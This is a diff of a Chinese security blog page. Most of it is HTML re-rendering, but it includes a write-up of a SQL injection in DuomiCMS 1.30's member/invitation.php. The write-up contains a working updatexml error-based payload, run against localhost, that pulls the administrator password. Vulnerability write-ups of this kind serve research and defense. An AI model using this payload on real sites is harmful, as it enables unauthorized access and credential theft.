 <li><p>漏洞页面：<code>\member\invitation.php</code></p>
- <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($dm==<span class="string">'yq'</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$ccgid=$_SESSION[<span class="string">'duomi_user_group'</span>];</span><br><span class="line">	$ccuid=$_SESSION[<span class="string">'duomi_user_id'</span>];</span><br><span class="line">	$cc1=$dsql-&gt;GetOne(<span class="string">"select * from duomi_member_group where gid=$ccgid"</span>);</span><br><span class="line">	$ccgroup=$cc1[<span class="string">'gname'</span>];</span><br><span class="line">	$cc2=$dsql-&gt;GetOne(<span class="string">"select * from duomi_member where id=$ccuid"</span>);</span><br><span class="line">	$ccjifen=$cc2[<span class="string">'points'</span>];</span><br><span class="line">	$ccemail=$cc2[<span class="string">'email'</span>];</span><br><span class="line">	$cclog=$cc2[<span class="string">'logincount'</span>];</span><br></pre></td></tr></table></figure>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($dm==<span class="string">&#x27;yq&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$ccgid=$_SESSION[<span class="string">&#x27;duomi_user_group&#x27;</span>];</span><br><span class="line">	$ccuid=$_SESSION[<span class="string">&#x27;duomi_user_id&#x27;</span>];</span><br><span class="line">	$cc1=$dsql-&gt;GetOne(<span class="string">&quot;select * from duomi_member_group where gid=<span class="subst">$ccgid</span>&quot;</span>);</span><br><span class="line">	$ccgroup=$cc1[<span class="string">&#x27;gname&#x27;</span>];</span><br><span class="line">	$cc2=$dsql-&gt;GetOne(<span class="string">&quot;select * from duomi_member where id=<span class="subst">$ccuid</span>&quot;</span>);</span><br><span class="line">	$ccjifen=$cc2[<span class="string">&#x27;points&#x27;</span>];</span><br><span class="line">	$ccemail=$cc2[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">	$cclog=$cc2[<span class="string">&#x27;logincount&#x27;</span>];</span><br></pre></td></tr></table></figure>
 <p> $ccgid，$ccuid均无任何过滤直接带入查询，由于变量覆盖导致此处两个变量均可控制</p>
 <p> 该cms采用80sec通用防注入，网上公开方法即可绕过。</p>
 <p> 利用：来到member页面，随便注册一个用户,test,登入。</p>
- <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//127.0.0.1/duomicms_1.30/member/invitation.php</span></span><br><span class="line">_SESSION[duomi_user_id]=@`<span class="string">'` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`'</span>`&amp;_SESSION[duomi_user_group]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//127.0.0.1/duomicms_1.30/member/invitation.php</span></span><br><span class="line">_SESSION[duomi_user_id]=@`<span class="string">&#x27;` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`&#x27;</span>`&amp;_SESSION[duomi_user_group]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p> 注出管理员密码</p>
           <!--noindex-->
             <div class="post-button">
@@ -743,7 +840,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -757,10 +854,10 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/redn3ck" title="GitHub → https://github.com/redn3ck" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+        <a href="https://github.com/redn3ck" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;redn3ck" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="mailto:NjMwOTM2MTkxQHFxLmNvbQ==" title="E-Mail → mailto:NjMwOTM2MTkxQHFxLmNvbQ==" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+        <a href="mailto:NjMwOTM2MTkxQHFxLmNvbQ==" title="E-Mail → mailto:NjMwOTM2MTkxQHFxLmNvbQ&#x3D;&#x3D;" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
       </span>
   </div>
 
@@ -771,7 +868,7 @@
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="http://blog.qinqinyo.com" title="http://blog.qinqinyo.com" rel="noopener" target="_blank">Biglao</a>
+          <a href="http://blog.qinqinyo.com/" title="http:&#x2F;&#x2F;blog.qinqinyo.com" rel="noopener" target="_blank">Biglao</a>
         </li>
     </ul>
   </div>
@@ -801,7 +898,7 @@
   </span>
   <span class="author" itemprop="copyrightHolder">redn3ck</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
         
@@ -843,9 +940,17 @@
   <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
   <script src="/lib/velocity/velocity.min.js"></script>
   <script src="/lib/velocity/velocity.ui.min.js"></script>
-<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
 <script src="/js/schemes/pisces.js"></script>
+
+
 <script src="/js/next-boot.js"></script>
+
 
 
 
@@ -854,7 +959,9 @@
 
 
 
-  <script src="/js/local-search.js"></script>
+  
+<script src="/js/local-search.js"></script>
+
 
 
 
